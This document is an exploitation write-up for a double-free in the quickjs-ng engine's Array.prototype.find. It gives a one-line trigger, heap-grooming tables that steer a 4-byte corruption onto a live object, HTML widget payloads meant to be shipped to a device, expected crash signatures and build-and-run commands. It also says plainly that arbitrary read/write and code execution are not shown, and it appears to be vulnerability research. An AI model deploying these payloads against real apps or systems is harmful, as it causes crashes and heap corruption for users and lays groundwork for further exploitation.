# In-unwind exploitation of quickjs-ng #1792 (`js_array_find`)

Single eval, no script2, no post-interrupt JS. Engine: quickjs-ng v0.17.0,
arena enabled, release layout (`-DNDEBUG`). App model: die() does not free
the context.

Artifacts: `single_eval.c`, `arena_inst.c`, `build_poc.sh`,
`widget_payload_*.html`, logs `o0_*.txt`, `asan500.txt`, `td_*.txt`.

## 0. Release layout (important)

`ENABLE_DUMPS` is `#ifndef NDEBUG` (`quickjs.c:84`). Therefore in the app's
release build `sizeof(JSString) = 24` and character data starts at offset 24.
The earlier harness runs (assert build) used `sizeof(JSString) = 40`. Release
size classes:

| value | block | class |
|---|---|---|
| 1-char JSString (string elements) | 24+1+1=26 -> 32+8 | **40** |
| 0..7-char JSString | <=32+8 | 40 |
| JSObject `{}` | 72+8 | 80 |
| 48..55-char JSString | 73..80+8 | 80 |
| JSShape | 56+8 | 64 |
| JSVarRef | 48+8 | 56 |

The app payload's element is a **1-char JSString in class 40**.

## 1. Reliable single-eval trigger at the loop top

Payload (one eval, no setup eval, no script2):

```js
Array.prototype.find.call('A'.repeat(N), Number);
```

With a poll-target interrupt (call #1 returns 0, call #2 fires 10000 polls
later) the exact payload fires at the **loop-top poll** in the release build:

```
[inst] POLL fire at k=4998 valtag=-7 valptr=0x...
```

There is no script2 and no post-interrupt JS. The stale free happens in the
exception path of `js_array_find` itself.

ASan with the release layout (`-DNDEBUG -fsanitize=address`, arena forced on),
CPU budget 500 ms, `JS_SetMemoryLimit(6 MiB)`, N=2,000,000 **and** N=4,000,000
(both fire at the same iteration; the budget, not N, sets the fire point):

```
[inst] POLL fire at k=1064998 valtag=-7 ...
[df] ... orig_idx=30 H=31 k=i-H=-1
==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 2
    #0 js_arena_free quickjs.c:2040
    #1 js_free_rt
0x...84fe is located 2 bytes before 4080-byte region [0x...8500,0x...94f0)
                                      (the class-40 arena slab)
```

So the UAF/double-free is confirmed in a single eval, in-unwind, without any
second script.

### N for the device's 500 ms budget

Measured iteration counts at 500 ms CPU:

| build | rate | fire iteration for N=2M/3M/4M |
|---|---|---|
| -O0 -DNDEBUG (≈device) | ~4.3 k/ms | 2M: loop ends at 460 ms (no fire); **3M: k=2 174 998; 4M: k=2 164 998** |
| ASan -O1 release layout | ~2.1 k/ms | 4M: **k=1 064 998** |

With the device's reported 0.5–1.2 M iterations / 300 ms (1.7–4 k/ms),
500 ms corresponds to ~0.85–2 M iterations. Therefore:

* **N = 2,000,000** is the minimum if the device is ≤ 4 k it/ms (loop ends at
  ~500 ms exactly — borderline).
* **N = 3,000,000** is the safe minimum (covers up to 6 k it/ms).
* **N = 4,000,000** (4.1 MB, still < 6 MiB) covers up to 8 k it/ms and is the
  recommended widget size.

If the interrupt fires at the predicate-call poll instead of the loop top,
no stale free happens. The parity is one poll; a single extra JS call flips
it (`(function(){})();` before the find). Ship both variants.

## 2. The second free's bogus arena write (measured)

`js_arena_free` after the stale free:

```c
block_idx = b->u.block_idx;          /* == free_next written by 1st free == H */
block_size = arena_block_sizes[b->block_size_idx];
ar = (JSArena *)((uint8_t *)b - block_size*H - sizeof(JSArena));
b->u.free_next = ar->first_free_block;   /* read  */
ar->first_free_block = block_idx;        /* write H at ar+38 */
if (ar->n_used_blocks == ar->n_blocks) list_add(...);
ar->n_used_blocks--;                     /* RMW 2 bytes at ar+34 */
```

With `i` = the freed block's index in its arena `A` and `k = i - H`:

* `ar = A + k*block_size` (measured; `b` here is the block header).
* writes: **2 bytes at `ar+34`** (a 16-bit decrement of whatever is there)
  and **2 bytes at `ar+38`** (`= H`, the free-list index, 0..~100).

Measured natural case (no grooming, steady-state loop):

```
[df] ptr=... rec_bs=40 hdr_bsi=3 hdr_bs=40 orig_idx=30 H=31 k=i-H=-1
[df]  real_arena=0x...ce0 bogus_arena=0x...cb8 delta=-40 writes @+0x...cda @+0x...cde
```

`ar = A - 40`, so the writes land at **A-6 and A-2**, i.e. inside the glibc
`size` field of the class-40 arena slab's malloc chunk (chunk header at
A-16..A-1). That is a direct corruption of the allocator's chunk size of the
4 KB arena block.

### Grooming H / k

H is the free-list head when the first free happens. In the find loop's
steady state the char block cycles with its successor, so `H = i+1` and
`k = -1` naturally. Pre-find allocation/free of class-40 strings (`'x'.repeat(7)`,
runtime strings, not literals) shifts H and hence k. Measured with
`GROOM=K` (free block 0 then block K-1 just before the find):

| K | k=i-H | crash at teardown |
|---|---|---|
| 0 | -1 | **SIGABRT `double free or corruption (out)`** |
| 8 | -10 | none |
| 16 | -18 | SIGSEGV (GC mark_children) |
| 24 | -26 | none |
| 32 | -34 | SIGSEGV (GC mark_children, target = a live JSObject at A-1360) |
| 48 | -50 | SIGSEGV |
| 64 | -66 | SIGSEGV |
| 96/128 | -3 | none |

So the write target `A + k*40` can be moved in 40-byte steps before the slab
and can land on a live GC object. At K=32 the target was exactly a JSObject
address (`gp = A - 1360`) and the writes hit its `prop` field (offset 32..39,
bytes 34/38); the teardown GC then crashed in `mark_children`
(`JS_MarkValue(rt, pr->u.value, ...)`) because the property pointer was
corrupted. The crash is at the corrupted object, not a random address.

Positive k (H < i) would target a class-40 block's user data (short-string
characters at offset 26/30) inside the slab; we did not obtain H < i with the
grooms tested.

### What the write can and cannot reach

* **Arena header (A), a shape, a function pointer, the JSRuntime/JSContext:**
  not reachable as-is. `ar+34/+38` cannot equal the arena header (that needs
  `k=0`, i.e. H=i, impossible since block i was allocated). Shapes/functions/
  runtime are separate allocations; only reachable if heap grooming places
  one at `A + k*40 - 34`, which is plausible but not demonstrated.
* **The value written is not a pointer**: `H` is a 16-bit free-list index and
  the other write is a decrement of the 16-bit word at `ar+34`. This is a
  metadata/field corruption primitive, not an arbitrary 64-bit write.
* **What is confirmed**: (a) corruption of the class-40 slab's malloc chunk
  size (natural k=-1); (b) corruption of a live JSObject's `prop` pointer via
  a groom (GC crash at the object).

## 3. App model: no teardown vs teardown

* **No teardown** (`die()` keeps the context/runtime): the process does not
  crash; the corrupted chunk stays latent. 1000 rounds of host malloc/free
  churn (32..8000 bytes) did not hit it. This is heap corruption, not an
  immediate crash.
* **Teardown** (`JS_FreeContext`+`JS_FreeRuntime`, and `JS_FreeRuntime`
  alone): **3/3 deterministic SIGABRT** with glibc
  `double free or corruption (out)`, in `free()` called from
  `js_free_rt → free_object → gc_free_cycles → JS_RunGC → JS_FreeRuntime`.
  The aborted object is the chunk immediately before the corrupted class-40
  slab, so glibc checks the corrupted next-chunk size while freeing it.
* **Control**: a CALL-site fire (no stale free, one-poll pad) + teardown
  survives (exit 0). The abort is caused specifically by the loop-top double
  free.
* **Grooming shapes the crash**: SIGABRT (chunk size) vs SIGSEGV in
  `mark_children` (JSObject prop pointer) vs no crash, depending on k.

On Android the allocator is scudo, not glibc. The corrupted field is the
chunk size of a 4 KB primary allocation; scudo checks chunk headers on free
and is expected to abort with `Scudo ERROR: invalid chunk state` /
`corrupted chunk header` when that slab (or its neighbour) is freed, or to
crash in `js_arena_free` on the next use. Not verified on-device.

## 4. Widget payload for device validation

Files: `widget_payload_nudge0.html`, `widget_payload_nudge1.html`
(single `<script>`, visible `<div>`, no second script, no external resources).

```html
<div id="w" style="font:16px sans-serif">loading</div>
<script>
Array.prototype.find.call('A'.repeat(4000000), Number);
document.getElementById('w').textContent = 'returned';
</script>
```

* N=4,000,000 chars = 4.1 MB, fits the 6 MiB cap (measured
  `malloc_size` ≈ 4.1 MB; the runtime plus the find's transient arena slabs
  stay well under).
* `Number` is the C predicate; use the `nudge1` variant
  (`(function(){})();` before the find) if the device fires at the predicate
  call with `nudge0`. The two variants exist because the poll parity is fixed
  per engine build and cannot be retried after the uncatchable interrupt.
* The visible div stays at "loading" if the script dies (the expected case).

### Expected logcat / tombstone signature

If the app frees the runtime on die:

```
F/libc   : Fatal signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid ... (engine thread)
F/DEBUG  : backtrace:
F/DEBUG  :   #00 libc.so (free+...)
F/DEBUG  :   #01 libquickjs.so (js_arena_free+...)
F/DEBUG  :   #02 libquickjs.so (js_free_rt+...)
F/DEBUG  :   #03 libquickjs.so (JS_FreeRuntime+...)
E/libc   : "double free or corruption (out)"        (glibc host / local build)
```
or, on bionic/scudo:
```
E scudo   : invalid chunk state when deallocating address 0x...
F/libc    : Fatal signal 6 (SIGABRT) ...
```
If the runtime is *not* freed, expect no tombstone: logcat shows the sandbox
reporting `InternalError: interrupted` and the JS engine becoming unusable
(the M1 observation); the process keeps a corrupted chunk.

## 5. Capability statement (explicit)

* **Deterministic DoS/crash**: yes, conditional on the runtime (or the chunk
  immediately before the class-40 slab) being freed. In the local release
  build this is 3/3 `SIGABRT` at `JS_FreeRuntime`; with the runtime kept alive
  it is latent corruption.
* **Controlled corruption**: yes — the write target moves in 40-byte steps
  with the groomed free-list index; at k=-34 it corrupted a live JSObject's
  `prop` pointer and crashed the GC at that object; the written value is H
  (a small index) plus a 16-bit decrement.
* **Arbitrary read/write**: **not demonstrated**. No 64-bit pointer write, no
  controlled allocation overlap, no read primitive in this path.
* **RCE**: **not demonstrated** and not claimed.

The in-unwind primitive is a 4-byte (2+2) metadata/field corruption with a
tunable target near the class-40 arena slab. Turning it into arbitrary R/W
would require (a) placing a useful victim (shape, function bytecode, prop
array) at the accessible offsets and (b) dealing with the small written
value; that is future work.

## 6. Reproduce

```sh
cd /tmp/opencode
# release-layout instrumented engine + harness
gcc -O2 -DNDEBUG -fno-omit-frame-pointer -I qjs017 -c arena_inst.c -o arena_inst_rel.o
gcc -O2 -DNDEBUG -I qjs017 -c qjs017/libregexp.c -o lr_rel.o
gcc -O2 -DNDEBUG -I qjs017 -c qjs017/libunicode.c -o lu_rel.o
gcc -O2 -DNDEBUG -I qjs017 -c qjs017/dtoa.c -o dt_rel.o
gcc -O2 -fno-omit-frame-pointer -I qjs017 single_eval.c \
    arena_inst_rel.o lr_rel.o lu_rel.o dt_rel.o -lm -lpthread -rdynamic -o single_eval_rel

# loop-top trigger + in-unwind bogus write
./single_eval_rel strnum 4000000 0 2          # poll-target 2, POLL fire
# deterministic abort if the runtime is torn down
TEARDOWN=1 ./single_eval_rel strnum 4000000 0 2
# groomed target (k=-34 -> JSObject prop pointer)
GROOM=32 TEARDOWN=1 ./single_eval_rel strnum 4000000 0 2
# device-scaled: -O0 build, 500 ms CPU, 6 MiB cap
TEARDOWN=1 MEMLIMIT=6291456 ./single_eval_o0 strnum 3000000 500
```
